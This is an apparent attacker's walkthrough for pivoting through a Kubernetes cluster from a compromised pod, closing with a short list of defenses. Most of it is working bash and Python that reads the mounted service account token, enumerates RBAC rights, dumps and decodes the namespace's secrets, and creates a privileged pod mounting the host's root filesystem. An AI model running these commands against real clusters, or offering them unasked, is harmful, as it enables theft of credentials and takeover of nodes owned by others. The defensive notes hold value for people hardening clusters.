# Pivoting Through Kubernetes via Mounted Service Account Tokens

Once you have a shell inside a pod, the auto-mounted service account token is
your first move for lateral movement. Most clusters still mount tokens by default,
and many have overly permissive RBAC bindings.

## Step 1: Grab the Token and Locate the API Server

```bash
# Every pod gets these unless automountServiceAccountToken: false
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Quick auth check — what can this token do?
curl -sk "$APISERVER/apis" -H "Authorization: Bearer $TOKEN" | head -20
```

## Step 2: Enumerate Your Permissions (No kubectl Needed)

```bash
# SelfSubjectRulesReview — ask the API what verbs you have
curl -sk "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NAMESPACE\"}}" \
  | python3 -c "
import sys,json
rules = json.load(sys.stdin).get('status',{}).get('resourceRules',[])
for r in rules:
    verbs = ','.join(r.get('verbs',[]))
    resources = ','.join(r.get('resources',[]))
    if resources: print(f'  {verbs:30s} -> {resources}')
"
```

## Step 3: Steal Secrets From Accessible Namespaces

```bash
# List secrets (if your SA has get/list on secrets — surprisingly common)
curl -sk "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "
import sys,json,base64
for s in json.load(sys.stdin).get('items',[]):
    name = s['metadata']['name']
    for k,v in s.get('data',{}).items():
        decoded = base64.b64decode(v).decode(errors='replace')[:80]
        print(f'[{name}] {k} = {decoded}')
"
```

## Step 4: Spawn a Privileged Pod for Node Access

```bash
# If you can create pods, game over — mount the host filesystem
curl -sk "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
  "apiVersion": "v1", "kind": "Pod",
  "metadata": {"name": "debug-node", "namespace": "'$NAMESPACE'"},
  "spec": {
    "hostPID": true, "hostNetwork": true,
    "containers": [{"name": "pwn", "image": "alpine",
      "command": ["/bin/sh","-c","sleep 3600"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "hostfs", "mountPath": "/host"}]
    }],
    "volumes": [{"name": "hostfs", "hostPath": {"path": "/"}}]
  }
}'
```

## Defense

- Set `automountServiceAccountToken: false` on pods that don't need API access
- Use **bound service account tokens** (audience/expiry-scoped, default since 1.22+)
- Enforce `restricted` Pod Security Standard to block privileged pod creation
- Audit RBAC: `kubectl auth can-i --list --as=system:serviceaccount:$NS:$SA`
